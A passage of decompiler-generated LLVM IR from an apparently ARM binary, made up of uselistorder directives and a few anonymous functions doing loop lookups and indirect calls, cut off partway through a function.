  uselistorder i32 %v2_85dc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8594248, { 1, 0 }
  uselistorder i32 %v5_8590, { 1, 0 }
  uselistorder i8* %v1_8940, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8748, { 0, 21, 1, 20, 2, 23, 3, 22, 25, 4, 24, 5, 27, 6, 26, 7, 29, 8, 28, 9, 31, 10, 30, 11, 19, 34, 12, 33, 13, 35, 14, 17, 15, 18, 16, 36, 32 }
  uselistorder i32 %v2_86d0, { 1, 0 }
  uselistorder i32 %v3_9eb8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-20856.0.ph, { 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 3, 68, 67, 4, 66, 65, 5, 63, 62, 6, 79, 78, 7, 77, 8, 76, 75, 9, 74, 73, 10, 72, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 58, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_8500, { 1, 0 }
  uselistorder i32 %v0_8500, { 1, 0 }
  uselistorder i32 %v2_84d0, { 2, 1, 3, 0, 5, 4, 6 }
  uselistorder i32 %v2_84c0, { 1, 0 }
  uselistorder i32 %v8_84a4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8484, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_83b0, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32 %v0_839c, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 11, 3, 4, 12, 10, 27, 8, 5, 6, 9, 7, 22, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_8390, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32 %v1_831c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_830c, { 1, 0 }
  uselistorder i32 %v3_8308, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32 %v2_8300, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32* %v11_82f4, { 1, 0, 2 }
  uselistorder i32 %v10_82f0, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_82d8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_82c8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_82a8, { 1, 0 }
  uselistorder i32 %v0_82a4, { 1, 0, 3, 2 }
  uselistorder i8* %tmp199, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_8280, { 0, 16, 22, 23, 24, 1, 19, 2, 20, 21, 25, 10, 3, 15, 4, 17, 18, 26, 5, 14, 6, 27, 7, 13, 28, 8, 12, 29, 9, 11, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 %v5_8278, { 1, 0 }
  uselistorder i32 %v6_8200, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_81e4, { 2, 1, 0 }
  uselistorder i32 %v1_81d8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-20809, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 1, 41, 44, 42, 43 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 14, 15, 10, 13, 11, 12, 17, 18, 16, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 8, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 12, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 154, 151, 152, 153, 155, 156, 157, 158, 159, 160, 161, 162, 163, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 147, 148, 149, 150, 98, 99, 100, 101, 105, 102, 103, 104, 106, 107, 110, 111, 108, 109, 112, 114, 113, 115, 116, 117, 118, 119, 124, 120, 121, 122, 123, 125, 127, 126, 2, 129, 128, 1, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 164, 146, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 102, 103, 104, 105, 106, 107, 108, 109, 110, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 99, 100, 101, 66, 67, 68, 69, 70, 73, 74, 71, 72, 75, 76, 77, 78, 79, 80, 81, 83, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 43, 25, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 44, 45, 9, 159, 160, 161, 162, 165, 163, 164, 166, 167, 168, 169, 170, 171, 172, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 152, 153, 154, 155, 156, 157, 158, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 123, 122, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 150, 0 }
  uselistorder i32* %r0.global-to-local, { 21, 20, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 207, 37, 143, 35, 77, 43, 38, 40, 39, 41, 44, 42, 46, 45, 48, 47, 49, 51, 50, 52, 55, 53, 54, 57, 56, 60, 58, 59, 61, 62, 63, 65, 64, 66, 67, 68, 70, 69, 71, 73, 72, 75, 74, 76, 79, 78, 81, 80, 82, 84, 83, 86, 85, 87, 89, 88, 90, 93, 91, 92, 95, 94, 98, 96, 97, 99, 101, 100, 103, 102, 105, 104, 106, 108, 107, 109, 111, 110, 112, 113, 114, 19, 116, 115, 118, 117, 119, 121, 120, 122, 327, 328, 330, 329, 332, 331, 333, 12, 334, 335, 11, 336, 10, 337, 9, 8, 7, 338, 339, 340, 342, 341, 343, 345, 344, 347, 346, 123, 124, 125, 127, 126, 128, 130, 129, 132, 131, 134, 133, 135, 137, 136, 138, 139, 141, 140, 18, 142, 145, 144, 147, 146, 149, 148, 152, 150, 151, 154, 153, 155, 157, 156, 158, 160, 159, 162, 161, 164, 163, 165, 167, 166, 168, 170, 169, 171, 172, 174, 173, 176, 175, 177, 179, 178, 180, 182, 181, 183, 184, 186, 185, 188, 187, 189, 191, 190, 192, 194, 193, 195, 197, 196, 198, 199, 201, 200, 203, 202, 210, 204, 205, 274, 206, 208, 209, 17, 211, 212, 2, 213, 214, 215, 216, 217, 218, 219, 221, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 220, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 256, 255, 257, 258, 259, 260, 262, 261, 263, 264, 265, 1, 266, 13, 267, 269, 268, 15, 16, 271, 270, 279, 272, 273, 275, 277, 276, 278, 36, 280, 14, 282, 281, 6, 283, 5, 284, 285, 4, 286, 3, 287, 288, 290, 289, 292, 291, 293, 294, 295, 297, 296, 298, 299, 301, 300, 303, 302, 305, 304, 307, 306, 309, 308, 310, 311, 312, 313, 314, 315, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 31, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 53, 54, 55, 56, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 51, 52, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 6, 3, 2, 8, 26, 27, 28, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 139, 140, 97, 98, 99, 100, 101, 102, 107, 109, 108, 103, 104, 105, 106, 110, 111, 112, 113, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 42, 43, 50, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 132, 133, 97, 98, 103, 102, 99, 100, 101, 104, 105, 106, 107, 108, 109, 117, 118, 110, 111, 112, 113, 114, 115, 116, 119, 0, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 42, 43, 50, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 135, 136, 97, 98, 99, 104, 106, 105, 100, 101, 102, 103, 107, 108, 109, 110, 111, 112, 120, 121, 113, 114, 115, 116, 117, 118, 119, 122, 0, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 46, 47, 54, 48, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 66, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 150, 151, 152, 104, 105, 110, 112, 111, 106, 107, 108, 109, 113, 114, 115, 116, 117, 118, 119, 129, 130, 120, 121, 122, 123, 124, 125, 126, 127, 128, 131, 132, 0, 1, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149 }
  uselistorder i32 ptrtoint (i32* @global_var_15f58.51 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f48.46 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f40.44 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_15f3c.42 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15f14.28 to i32), { 0, 2, 1, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e70, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d1c, { 1, 0 }
  uselistorder label %.thread72, { 1, 0 }
  uselistorder label %dec_label_pc_9cf0, { 2, 0, 1 }
  uselistorder label %.thread69, { 1, 0 }
  uselistorder label %dec_label_pc_9b34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a14, { 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %dec_label_pc_99e8, { 2, 0, 1 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_9884, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_9838, { 1, 0 }
  uselistorder label %dec_label_pc_9810, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9804, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %dec_label_pc_965c, { 1, 0 }
  uselistorder label %dec_label_pc_95ec, { 1, 0 }
  uselistorder label %dec_label_pc_94c0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9498, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9430, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9400, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %dec_label_pc_9284, { 1, 0 }
  uselistorder label %dec_label_pc_927c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9254, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_9124, { 2, 1, 0 }
  uselistorder label %bb220, { 1, 0 }
  uselistorder label %.thread48, { 3, 0, 1, 2 }
  uselistorder label %bb217, { 1, 0 }
  uselistorder label %.thread47, { 3, 0, 1, 2 }
  uselistorder label %bb214, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_8e20, { 1, 0 }
  uselistorder label %dec_label_pc_8d48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8ccc, { 1, 0 }
  uselistorder label %dec_label_pc_8cb4, { 1, 0 }
  uselistorder label %dec_label_pc_8c78, { 1, 0 }
  uselistorder label %dec_label_pc_8c04, { 1, 0 }
  uselistorder label %dec_label_pc_8bcc, { 1, 0 }
  uselistorder label %dec_label_pc_890c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88dc, { 1, 0 }
  uselistorder label %dec_label_pc_8838, { 7, 8, 2, 9, 1, 10, 3, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8630, { 4, 1, 0, 2, 3, 5 }
  uselistorder label %dec_label_pc_855c.dec_label_pc_855c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_853c.dec_label_pc_853c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8528, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_8528.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c8, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b8, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f84(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f84:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_9f84 = urem i32 %arg1, 256
  %v2_9f88 = icmp eq i32 %v1_9f84, 0
  %v1_9f90 = urem i32 %arg3, 256
  br i1 %v2_9f88, label %dec_label_pc_9fd4, label %dec_label_pc_9f9c

dec_label_pc_9f9c:                                ; preds = %dec_label_pc_9f84
  %v0_9f9c = load i32, i32* %r1.global-to-local, align 4
  %v1_9f9c = add i32 %v0_9f9c, 4
  %v2_9f9c = inttoptr i32 %v1_9f9c to i8*
  %v3_9f9c = load i8, i8* %v2_9f9c, align 1
  %v4_9f9c = zext i8 %v3_9f9c to i32
  %v9_9fa0 = icmp eq i32 %v4_9f9c, %v1_9f90
  br i1 %v9_9fa0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.preheader

dec_label_pc_9fc4.preheader:                      ; preds = %dec_label_pc_9f9c
  br label %dec_label_pc_9fc4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9fc4
  %v1_9fb4 = add i32 %v0_9fbc.in, 12
  %v2_9fb4 = inttoptr i32 %v1_9fb4 to i8*
  %v3_9fb4 = load i8, i8* %v2_9fb4, align 1
  %v4_9fb4 = zext i8 %v3_9fb4 to i32
  %v9_9fb8 = icmp eq i32 %v4_9fb4, %v1_9f90
  br i1 %v9_9fb8, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9fc4.preheader, %dec_label_pc_9fb4
  %v0_9fbc.in = phi i32 [ %v0_9f9c, %dec_label_pc_9fc4.preheader ], [ %v0_9fbc, %dec_label_pc_9fb4 ]
  %v0_9fc4 = phi i32 [ 0, %dec_label_pc_9fc4.preheader ], [ %v1_9fc4, %dec_label_pc_9fb4 ]
  %v0_9fbc = add i32 %v0_9fbc.in, 8
  %v1_9fc4 = add i32 %v0_9fc4, 1
  store i32 %v1_9fc4, i32* @lr, align 4
  %v9_9fc8 = icmp eq i32 %v1_9fc4, %v1_9f84
  store i32 %v0_9fbc, i32* %r1.global-to-local, align 4
  br i1 %v9_9fc8, label %dec_label_pc_9fd4, label %dec_label_pc_9fb4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9f84
  ret i32 %arg4

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fb4, %dec_label_pc_9f9c
  %v0_9fdc = phi i32 [ %v0_9f9c, %dec_label_pc_9f9c ], [ %v0_9fbc, %dec_label_pc_9fb4 ]
  %v1_9fdc = inttoptr i32 %v0_9fdc to i32*
  %v2_9fdc = load i32, i32* %v1_9fdc, align 4
  ret i32 %v2_9fdc

; uselistorder directives
  uselistorder i32 %v1_9fc4, { 1, 2, 0 }
  uselistorder i32 %v0_9fbc, { 1, 0, 2 }
  uselistorder i32 %v0_9fbc.in, { 1, 0 }
  uselistorder i32 %v0_9f9c, { 1, 0, 2 }
  uselistorder i32 %v1_9f90, { 1, 0 }
  uselistorder i32 %v1_9f84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fc4, { 1, 0 }
}

define i32 @function_9fe8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9fe8:
  store i32 %arg1, i32* @r6, align 4
  %v1_9ff4 = urem i32 %arg2, 256
  store i32 %v1_9ff4, i32* @r7, align 4
  %v0_a000 = call i32 @function_13680()
  %v7_a004 = icmp eq i32 %v0_a000, -1
  %tmp23 = icmp slt i32 %v0_a000, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9fe8
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_9fe8
  %. = zext i1 %v7_a004 to i32
  store i32 %., i32* @r5, align 4
  %v2_a01c = icmp eq i1 %v7_a004, false
  br i1 %v2_a01c, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  ret i32 %v0_a000

bb26:                                             ; preds = %bb24
  %v0_a024 = call i32 @function_13680()
  %v7_a028 = icmp eq i32 %v0_a024, -1
  store i32 %v0_a024, i32* @r4, align 4
  br i1 %v7_a028, label %dec_label_pc_a058, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %bb26
  %v2_a034 = icmp eq i32 %v0_a024, 0
  br i1 %v2_a034, label %dec_label_pc_a03c, label %dec_label_pc_a060

dec_label_pc_a03c:                                ; preds = %dec_label_pc_a034
  %v0_a03c = load i32, i32* @r6, align 4
  %v1_a040 = call i32 @function_14a84(i32 %v0_a03c)
  %v0_a044 = call i32 @function_136d8()
  %v2_a04c = call i32 @function_13754(i32 %v0_a044, i32 9)
  %v0_a050 = load i32, i32* @r4, align 4
  %v1_a054 = call i32 @function_149f0(i32 %v0_a050)
  br label %dec_label_pc_a058

dec_label_pc_a058:                                ; preds = %bb26, %dec_label_pc_a03c
  %v0_a058 = load i32, i32* @r5, align 4
  %v1_a05c = call i32 @function_149f0(i32 %v0_a058)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a034, %dec_label_pc_a058
  %v2_a064 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a064 = zext i8 %v2_a064 to i32
  %v2_a068 = icmp eq i8 %v2_a064, 0
  br i1 %v2_a068, label %dec_label_pc_a0ac, label %dec_label_pc_a070

dec_label_pc_a070:                                ; preds = %dec_label_pc_a060
  %v2_a074 = load i32, i32* @global_var_1ebc4.57, align 4
  %v1_a078 = inttoptr i32 %v2_a074 to i32*
  %v2_a078 = load i32, i32* %v1_a078, align 4
  store i32 %v2_a078, i32* @ip, align 4
  %v1_a07c = add i32 %v2_a078, 4
  %v2_a07c = inttoptr i32 %v1_a07c to i8*
  %v3_a07c = load i8, i8* %v2_a07c, align 1
  %v4_a07c = zext i8 %v3_a07c to i32
  %v1_a080 = load i32, i32* @r7, align 4
  %v9_a080 = icmp eq i32 %v4_a07c, %v1_a080
  br i1 %v9_a080, label %dec_label_pc_a0b4, label %dec_label_pc_a0a0.preheader

dec_label_pc_a0a0.preheader:                      ; preds = %dec_label_pc_a070
  %v1_a084 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a0a0

dec_label_pc_a090:                                ; preds = %dec_label_pc_a0a0
  %v4_a090 = mul i32 %v1_a0a0, 4
  %v5_a090 = add i32 %v4_a090, %v2_a074
  %v6_a090 = inttoptr i32 %v5_a090 to i32*
  %v7_a090 = load i32, i32* %v6_a090, align 4
  store i32 %v7_a090, i32* @ip, align 4
  %v1_a094 = add i32 %v7_a090, 4
  %v2_a094 = inttoptr i32 %v1_a094 to i8*
  %v3_a094 = load i8, i8* %v2_a094, align 1
  %v4_a094 = zext i8 %v3_a094 to i32
  %v9_a098 = icmp eq i32 %v4_a094, %v1_a080
  br i1 %v9_a098, label %dec_label_pc_a0b4, label %dec_label_pc_a0a0

dec_label_pc_a0a0:                                ; preds = %dec_label_pc_a0a0.preheader, %dec_label_pc_a090
  %v0_a0a0 = phi i32 [ %v1_a084, %dec_label_pc_a0a0.preheader ], [ %v1_a0a0, %dec_label_pc_a090 ]
  %v1_a0a0 = add i32 %v0_a0a0, 1
  %v9_a0a4 = icmp eq i32 %v1_a0a0, %v3_a064
  br i1 %v9_a0a4, label %dec_label_pc_a0ac, label %dec_label_pc_a090

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a0a0, %dec_label_pc_a060, %dec_label_pc_a0b4
  %v1_a0b0 = call i32 @function_149f0(i32 0)
  %v0_a0c8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_a090, %dec_label_pc_a070, %dec_label_pc_a0ac
  %v0_a0c8 = phi i32 [ %v2_a078, %dec_label_pc_a070 ], [ %v0_a0c8.pre, %dec_label_pc_a0ac ], [ %v7_a090, %dec_label_pc_a090 ]
  %v1_a0c8 = inttoptr i32 %v0_a0c8 to i32*
  %v2_a0c8 = load i32, i32* %v1_a0c8, align 4
  call void @__pseudo_branch(i32 %v2_a0c8)
  br label %dec_label_pc_a0ac

; uselistorder directives
  uselistorder i32 %v1_a0a0, { 2, 0, 1 }
  uselistorder i32 %v0_a024, { 1, 2, 0 }
  uselistorder i1 %v7_a004, { 1, 0 }
  uselistorder i32 %v0_a000, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a0b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a0ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a0a0, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a058, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_a0d8(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a0d8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_a0d8 = load i32, i32* @r4, align 4
  %v6_a0d8 = load i32, i32* @r5, align 4
  %v9_a0d8 = load i32, i32* @r6, align 4
  %v12_a0d8 = load i32, i32* @r7, align 4
  %v15_a0d8 = load i32, i32* @r8, align 4
  %v18_a0d8 = load i32, i32* @sb, align 4
  %v21_a0d8 = load i32, i32* @sl, align 4
  %v27_a0d8 = load i32, i32* @lr, align 4
  %v7_a0dc = icmp eq i32 %arg2, 3
  store i1 %v7_a0dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_a0e8 = load i32, i32* %r0.global-to-local, align 4
